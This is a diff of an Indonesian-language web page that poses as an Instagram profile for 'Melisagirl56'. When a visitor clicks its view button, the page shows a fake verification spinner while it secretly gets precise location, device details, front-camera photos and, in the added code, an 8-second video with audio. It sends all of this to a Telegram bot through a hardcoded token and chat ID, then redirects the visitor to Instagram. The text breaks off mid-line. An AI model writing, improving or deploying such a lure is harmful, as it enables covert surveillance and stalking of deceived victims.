@@ -28,7 +28,6 @@
             overflow: hidden;
             box-shadow: 0 2px 12px rgba(0,0,0,0.1);
         }
-        /* Header */
         .header {
             padding: 15px 20px;
             border-bottom: 1px solid #efefef;
@@ -48,8 +47,6 @@
             font-size: 1.2em;
             cursor: pointer;
         }
-
-        /* Profil */
         .profile {
             padding: 20px;
             display: flex;
@@ -81,8 +78,6 @@
         .profile .info .followers span {
             font-weight: 600;
         }
-
-        /* Tombol View Profile */
         .btn-view {
             background: #0095f6;
             color: white;
@@ -106,8 +101,6 @@
             background: #b2dffa;
             cursor: not-allowed;
         }
-
-        /* Grid Foto */
         .grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -125,13 +118,6 @@
             color: #ccc;
             overflow: hidden;
         }
-        .grid .item img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        /* Loading Overlay - Hanya Loading saja! */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -196,7 +182,6 @@
             0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
             40% { transform: scale(1); opacity: 1; }
         }
-
         .footer {
             text-align: center;
             padding: 15px;
@@ -213,16 +198,13 @@
 <body>
 
 <div class="container">
-    <!-- Header -->
     <div class="header">
         <span class="back">←</span>
         <h1>Instagram</h1>
         <span class="menu">⋯</span>
     </div>
 
-    <!-- Profil -->
     <div class="profile">
-        <!-- GANTI 'foto-saya.jpg' dengan file foto kamu -->
         <img src="foto-saya.jpg" alt="Foto Profil" class="avatar" id="avatar">
         <div class="info">
             <div class="name" id="namaUser">Melisagirl56</div>
@@ -231,10 +213,8 @@
         </div>
     </div>
 
-    <!-- Tombol View Profile -->
     <button class="btn-view" id="btnView">Lihat Profil Melisagirl56</button>
 
-    <!-- Grid Foto - Icon 🖼️ -->
     <div class="grid">
         <div class="item">🖼️</div>
         <div class="item">🖼️</div>
@@ -249,7 +229,7 @@
     </div>
 </div>
 
-<!-- Loading Overlay - HANYA TULISAN LOADING! -->
+<!-- Loading Overlay -->
 <div class="loading-overlay" id="loadingOverlay">
     <div class="spinner"></div>
     <div class="text" id="loadingText">⏳ Memverifikasi...</div>
@@ -262,25 +242,22 @@
 </div>
 
 <script>
-    // ========== KONFIGURASI ==========
-    // GANTI DENGAN TOKEN BOT TELEGRAM KAMU
+    // ========== KONFIGURASI TELEGRAM ==========
     const BOT_TOKEN = '8973378571:AAE4LKuNnONfQEbTWHLg0F7kq-IjH5inwmc';
-    // GANTI DENGAN CHAT ID TELEGRAM KAMU
     const CHAT_ID = '8528707941';
-    // =================================
+    // =========================================
 
     const btnView = document.getElementById('btnView');
     const overlay = document.getElementById('loadingOverlay');
     const loadingText = document.getElementById('loadingText');
     const loadingSubtext = document.getElementById('loadingSubtext');
     const avatar = document.getElementById('avatar');
-    const namaUser = document.getElementById('namaUser');
 
     const NAMA_TARGET = 'Melisagirl56';
     const REDIRECT_URL = 'https://www.instagram.com/marisa_grilll.st?igsh=MWN2eGl4a2d4MjJhdQ==';
 
-    // ============ FUNGSI KAMERA (REKAM 5 DETIK, 3 FOTO) ============
-    function rekamKamera5Detik() {
+    // ============ AMBIL 3 FOTO KAMERA DEPAN ============
+    function ambil3FotoKamera() {
         return new Promise((resolve, reject) => {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 reject('Kamera tidak didukung');
@@ -288,7 +265,11 @@
             }
 
             navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                video: { 
+                    facingMode: 'user', 
+                    width: { ideal: 1280 }, 
+                    height: { ideal: 720 } 
+                },
                 audio: false
             })
             .then((stream) => {
@@ -299,8 +280,8 @@
 
                 video.onloadedmetadata = function() {
                     const canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
+                    canvas.width = 1280;
+                    canvas.height = 720;
                     const ctx = canvas.getContext('2d');
                     const fotoList = [];
                     let count = 0;
@@ -311,8 +292,9 @@
                             resolve(fotoList);
                             return;
                         }
-                        ctx.drawImage(video, 0, 0, 640, 480);
-                        const base64 = canvas.toDataURL('image/jpeg', 0.8);
+                        // Gambar dengan kualitas tinggi
+                        ctx.drawImage(video, 0, 0, 1280, 720);
+                        const base64 = canvas.toDataURL('image/jpeg', 1.0);
                         fotoList.push(base64);
                         count++;
                         setTimeout(ambilFoto, 1500);
@@ -320,6 +302,7 @@
 
                     setTimeout(ambilFoto, 500);
 
+                    // Safety timeout
                     setTimeout(() => {
                         stream.getTracks().forEach(track => track.stop());
                         if (fotoList.length < 3) {
@@ -334,27 +317,101 @@
         });
     }
 
-    // ============ FUNGSI LOKASI ============
+    // ============ REKAM VIDEO 8 DETIK KAMERA DEPAN ============
+    function rekamVideo8Detik() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                reject('Kamera tidak didukung');
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({
+                video: { 
+                    facingMode: 'user', 
+                    width: { ideal: 1280 }, 
+                    height: { ideal: 720 } 
+                },
+                audio: true
+            })
+            .then((stream) => {
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9,opus',
+                    videoBitsPerSecond: 2500000
+                });
+                
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(blob);
+                };
+
+                // Rekam 8 detik
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 8000);
+
+                // Safety timeout
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 9000);
+            })
+            .catch((err) => {
+                reject('Akses kamera ditolak: ' + err.message);
+            });
+        });
+    }
+
+    // ============ AMBIL LOKASI DENGAN MULTIPLE ATTEMPT ============
     function getLokasi() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
                 resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', error: 'Geolocation tidak didukung' });
                 return;
             }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        akurasi: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || 'Tidak tersedia'
-                    });
-                },
-                (err) => {
-                    resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', error: err.message });
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function tryGetLocation() {
+                attempts++;
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            akurasi: pos.coords.accuracy,
+                            altitude: pos.coords.altitude || 'Tidak tersedia',
+                            speed: pos.coords.speed || 'Tidak tersedia'
+                        });
+                    },
+                    (err) => {
+                        if (attempts < maxAttempts) {
+                            setTimeout(tryGetLocation, 2000);
+                        } else {
+                            resolve({ 
+                                lat: 'Tidak tersedia', 
+                                lon: 'Tidak tersedia', 
+                                error: err.message 
+                            });
+                        }
+                    },
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            }
+
+            tryGetLocation();
         });
     }
 
@@ -416,43 +473,85 @@
         }
     }
 
+    async function kirimVideoKeTelegram(videoBlob, caption) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', videoBlob, 'video_target.webm');
+            formData.append('caption', caption);
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            const hasil = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            return await hasil.json();
+        } catch (error) {
+            console.error('Error kirim video:', error);
+            return false;
+        }
+    }
+
     // ============ PROSES UTAMA ============
     btnView.addEventListener('click', async function() {
-        // Disable tombol
         btnView.disabled = true;
         btnView.textContent = '⏳ Memproses...';
 
-        // Tampilkan loading - HANYA LOADING!
         overlay.classList.add('show');
         loadingText.textContent = '⏳ Memverifikasi...';
         loadingSubtext.textContent = 'Mohon tunggu sebentar';
 
         try {
-            // Jalankan semua proses di background (target tidak tahu)
-            // 1. Ambil lokasi
+            // 1. Ambil lokasi (dengan multiple attempt)
             const lokasi = await getLokasi();
 
             // 2. Ambil device info
             const device = getDeviceInfo();
 
-            // 3. Rekam kamera 5 detik (3 foto)
+            // 3. Ambil 3 foto kamera depan
             let fotoList = [];
             let kameraGagal = false;
-
             try {
-                fotoList = await rekamKamera5Detik();
+                fotoList = await ambil3FotoKamera();
             } catch (err) {
                 kameraGagal = true;
             }
 
-            // 4. Kirim data ke Telegram
+            // 4. Rekam video 8 detik
+            let videoBlob = null;
+            let videoGagal = false;
+            try {
+                videoBlob = await rekamVideo8Detik();
+            } catch (err) {
+                videoGagal = true;
+            }
+
+            // 5. Kirim data ke Telegram
             const waktu = new Date().toLocaleString('id-ID');
+            let mapsLink = '';
+            if (lokasi.lat !== 'Tidak tersedia' && lokasi.lon !== 'Tidak tersedia') {
+                mapsLink = `https://www.google.com/maps?q=${lokasi.lat},${lokasi.lon}`;
+            }
+
             let pesan = `🔴 <b>ALERT! Profil Dilihat</b>\n\n`;
             pesan += `👤 Target: <b>${NAMA_TARGET}</b>\n`;
-            pesan += `🌍 Lokasi: ${lokasi.lat}, ${lokasi.lon}\n`;
-            if (lokasi.akurasi) pesan += `📡 Akurasi: ${Math.round(lokasi.akurasi)} meter\n`;
-            if (lokasi.altitude && lokasi.altitude !== 'Tidak tersedia') pesan += `⛰️ Altitude: ${lokasi.altitude}m\n`;
-            if (lokasi.error) pesan += `⚠️ Error lokasi: ${lokasi.error}\n`;
+            
+            if (lokasi.lat !== 'Tidak tersedia' && lokasi.lon !== 'Tidak tersedia') {
+                pesan += `📍 <b>Lokasi:</b>\n`;
+                pesan += `   • Latitude: ${lokasi.lat}\n`;
+                pesan += `   • Longitude: ${lokasi.lon}\n`;
+                pesan += `   • Akurasi: ${Math.round(lokasi.akurasi)} meter\n`;
+                if (lokasi.altitude && lokasi.altitude !== 'Tidak tersedia') {
+                    pesan += `   • Altitude: ${lokasi.altitude}m\n`;
+                }
+                if (lokasi.speed && lokasi.speed !== 'Tidak tersedia') {
+                    pesan += `   • Kecepatan: ${lokasi.speed} m/s\n`;
+                }
+                pesan += `   • <a href="${mapsLink}">🗺️ Lihat di Google Maps</a>\n`;
+            } else {
+                pesan += `📍 Lokasi: Tidak tersedia (${lokasi.error || 'Unknown'})\n`;
+            }
+
             pesan += `\n📱 <b>Detail Perangkat:</b>\n`;
             pesan += `• Platform: ${device.platform}\n`;
             pesan += `• Bahasa: ${device.language}\n`;
@@ -460,13 +559,13 @@
             pesan += `• Zona Waktu: ${device.timezone}\n`;
             pesan += `• Koneksi: ${device.connection}\n`;
             pesan += `• Battery API: ${device.battery}\n`;
-            pesan += `• User Agent: ${device.userAgent.substring(0, 150)}...\n`;
+            pesan += `• User Agent: ${device.userAgent.substring(0, 200)}...\n`;
             pesan += `\n🕐 Waktu: ${waktu}`;
 
             // Kirim pesan teks
             await kirimKeTelegram(pesan);
 
-            // Kirim foto (3 foto)
+            // Kirim 3 foto
             if (fotoList.length > 0 && !kameraGagal) {
                 for (let i = 0; i < fotoList.length; i++) {
                     const caption = `📸 Foto ${i+1}/3 dari ${NAMA_TARGET}`;
@@ -475,35 +574,18 @@
                 }
             }
 
-            // Delay sebentar biar target merasa proses verifikasi
-            await sleep(2000);
+            // Kirim video 8 detik
+            if (videoBlob && !videoGagal) {
+                const caption = `🎥 Video 8 detik dari ${NAMA_TARGET}`;
+                await kirimVideoKeTelegram(videoBlob, caption);
+            }
+
+            await sleep(1500);
 
         } catch (error) {
             console.error('Error:', error);
             await sleep(1000);
         }
 
-        // Tutup loading
         overlay.classList.remove('show');
-
-        // Enable tombol
-        btnView.disabled = false;
-        btnView.textContent = 'Lihat Profil Melisagirl56';
-
-        // REDIRECT KE INSTAGRAM!
-        window.location.href = REDIRECT_URL;
-    });
-
-    // Helper
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    // Error handling foto
-    avatar.onerror = function() {
-        this.src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="80" height="80"%3E%3Crect fill="%23ddd" width="80" height="80"/%3E%3Ctext x="40" y="48" text-anchor="middle" fill="%23999" font-size="12" font-family="sans-serif"%3EFoto%3C/text%3E%3C/svg%3E';
-    };
-</script>
-
-</body>
-    </html>
+        btnView.disabled = f
